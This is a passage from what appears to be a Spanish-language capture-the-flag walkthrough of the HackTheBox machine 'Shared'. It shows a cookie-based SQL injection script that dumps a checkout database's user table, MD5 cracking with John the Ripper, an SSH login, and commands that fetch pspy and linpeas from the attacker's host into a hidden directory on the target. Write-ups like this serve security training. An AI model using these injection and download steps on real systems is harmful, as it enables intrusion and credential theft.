<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">curl</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -k</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -s</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">https://checkout.shared.htb</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -b</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">custom_cart=</span><span style="color:#B56959;--shiki-dark:#BABED8">$payload</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> |</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">	egrep</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &#39;</span><span style="color:#B56959;--shiki-dark:#C3E88D">&lt;/?td&gt;</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&#39;</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> |</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">	head</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -1</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> |</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">	sed</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -E</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &#39;</span><span style="color:#B56959;--shiki-dark:#C3E88D">s/^ *&lt;td&gt;(.*)&lt;\/td&gt;$/\1/</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&#39;</span></span></code></pre> 
<p>Entonces podemos ver si podemos obtener los nombres de las bases de datos disponibles. Recuerde que esta base de datos es probablemente MySQL porque el # comentario está funcionando.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">chmod</span><span style="color:#B56959;--shiki-dark:#C3E88D"> +x</span><span style="color:#B56959;--shiki-dark:#C3E88D"> sqli.sh</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BABED8">SELECT</span><span style="color:#999999;--shiki-dark:#89DDFF">=</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">group_concat(schema_name)</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#A65E2B;--shiki-dark:#BABED8">   \</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BABED8">FROM</span><span style="color:#999999;--shiki-dark:#89DDFF">=</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">information_schema.schemata</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#A65E2B;--shiki-dark:#BABED8">   \</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">	./sqli.sh</span></span></code></pre> 
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">information_schema,checkout</span></span></code></pre> 
<p>Hay una base de datos llamada checkout que deberíamos explorar. Busquemos los nombres de sus tablas.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#B07D48;--shiki-dark:#BABED8">SELECT</span><span style="color:#999999;--shiki-dark:#89DDFF">=</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">group_concat(table_name)</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#A65E2B;--shiki-dark:#BABED8">   \</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BABED8">FROM</span><span style="color:#999999;--shiki-dark:#89DDFF">=</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">information_schema.tables</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#A65E2B;--shiki-dark:#BABED8">    \</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BABED8">WHERE</span><span style="color:#999999;--shiki-dark:#89DDFF">=</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">table_schema=&#39;checkout&#39;</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#A65E2B;--shiki-dark:#BABED8">     \</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">	./sqli.sh</span></span></code></pre> 
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">user,product</span></span></code></pre> 
<p>La tabla de usuarios parece interesante. Busquemos los nombres de las columnas y volquemos el contenido de la tabla.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#B07D48;--shiki-dark:#BABED8">SELECT</span><span style="color:#999999;--shiki-dark:#89DDFF">=</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">group_concat(column_name)</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#A65E2B;--shiki-dark:#BABED8">   \</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BABED8">FROM</span><span style="color:#999999;--shiki-dark:#89DDFF">=</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">information_schema.columns</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#A65E2B;--shiki-dark:#BABED8">    \</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BABED8">WHERE</span><span style="color:#999999;--shiki-dark:#89DDFF">=</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">table_name=&#39;user&#39;</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#A65E2B;--shiki-dark:#BABED8">            \</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">	./sqli.sh</span></span></code></pre> 
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">id,username,password</span></span></code></pre> 
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#B07D48;--shiki-dark:#BABED8">SELECT</span><span style="color:#999999;--shiki-dark:#89DDFF">=</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">group_concat(concat(id,0x7c,username,0x7c,password))</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#A65E2B;--shiki-dark:#BABED8"> \</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BABED8">FROM</span><span style="color:#999999;--shiki-dark:#89DDFF">=</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">checkout.user</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#A65E2B;--shiki-dark:#BABED8"> \</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">	./sqli.sh</span></span></code></pre> 
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">1</span><span style="color:#AB5959;--shiki-dark:#89DDFF">|</span><span style="color:#59873A;--shiki-dark:#FFCB6B">james_mason</span><span style="color:#AB5959;--shiki-dark:#89DDFF">|</span><span style="color:#999999;--shiki-dark:#89DDFF">[</span><span style="color:#393A34;--shiki-dark:#BABED8">REDACTED</span><span style="color:#999999;--shiki-dark:#89DDFF">]</span></span></code></pre> 
<p>Sólo hay un resultado, pero tenemos lo que parece un hash MD5 en la columna de contraseña para el usuario james_mason.
Shell as james_mason</p>
<p>intentemos descifrar el hash usando a John the Ripper</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"># mhil4ne@kali</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BABED8">hash</span><span style="color:#999999;--shiki-dark:#89DDFF">=</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;&quot;</span><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"> # Hash here</span></span>
<span class="line"><span style="color:#998418;--shiki-dark:#82AAFF">echo</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">james_mason:</span><span style="color:#B56959;--shiki-dark:#BABED8">$hash</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> &gt;</span><span style="color:#B56959;--shiki-dark:#C3E88D"> md5.john</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">john</span><span style="color:#B56959;--shiki-dark:#C3E88D"> md5.john</span><span style="color:#A65E2B;--shiki-dark:#BABED8"> \</span></span>
<span class="line"><span style="color:#A65E2B;--shiki-dark:#C3E88D">	--format=</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">raw-md5</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#A65E2B;--shiki-dark:#BABED8"> \</span></span>
<span class="line"><span style="color:#A65E2B;--shiki-dark:#C3E88D">	--wordlist=</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">rockyou.txt</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"> # classic rockyou.txt wordlist</span></span></code></pre> 
<p>Usando estas credenciales en el servidor SSH del objetivo obtendremos un shell como james_mason.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"># mhil4ne@kali</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">ssh</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">james_mason@</span><span style="color:#B56959;--shiki-dark:#BABED8">$rhost</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span></span></code></pre> 
<p>No hay ninguna bandera de usuario en nuestro directorio de inicio, por lo que puede que tengamos que hacer algún movimiento lateral.</p>
<h1 id="lateral-movement">Lateral Movement</h1>
<p>Usaremos LinPEAS de PEASS-ng para buscar cualquier información útil en la máquina. También usaremos pspy para husmear en los procesos.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"># mhil4ne@kali</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BABED8">lhost</span><span style="color:#999999;--shiki-dark:#89DDFF">=</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">10.10.14.10</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"> # Listener host</span></span>
<span class="line"><span style="color:#998418;--shiki-dark:#82AAFF">cd</span><span style="color:#999999;--shiki-dark:#89DDFF"> $(</span><span style="color:#59873A;--shiki-dark:#FFCB6B">mktemp</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -d</span><span style="color:#999999;--shiki-dark:#89DDFF">)</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">wget</span><span style="color:#A65E2B;--shiki-dark:#BABED8"> \</span></span>
<span class="line"><span style="color:#B5695999;--shiki-dark:#89DDFF">	&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#A65E2B;--shiki-dark:#BABED8"> \</span></span>
<span class="line"><span style="color:#B5695999;--shiki-dark:#89DDFF">	&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">https://github.com/carlospolop/PEASS-ng/releases/download/20220522/linpeas.sh</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">php</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -S</span><span style="color:#B07D48;--shiki-dark:#BABED8"> $lhost</span><span style="color:#B56959;--shiki-dark:#C3E88D">:80</span></span></code></pre> 
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"># james_mason@shared.htb (SSH)</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BABED8">lhost</span><span style="color:#999999;--shiki-dark:#89DDFF">=</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">10.10.14.10</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"> # Attacker&#39;s IP address</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">mkdir</span><span style="color:#B56959;--shiki-dark:#C3E88D"> .sneak</span><span style="color:#999999;--shiki-dark:#89DDFF"> &amp;&amp;</span><span style="color:#998418;--shiki-dark:#82AAFF"> cd</span><span style="color:#B56959;--shiki-dark:#C3E88D"> .sneak</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">wget</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">http://</span><span style="color:#B56959;--shiki-dark:#BABED8">$lhost</span><span style="color:#B56959;--shiki-dark:#C3E88D">/pspy64</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">http://</span><span style="color:#B56959;--shiki-dark:#BABED8">$lhost</span><span style="color:#B56959;--shiki-dark:#C3E88D">/linpeas.sh</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span></span>
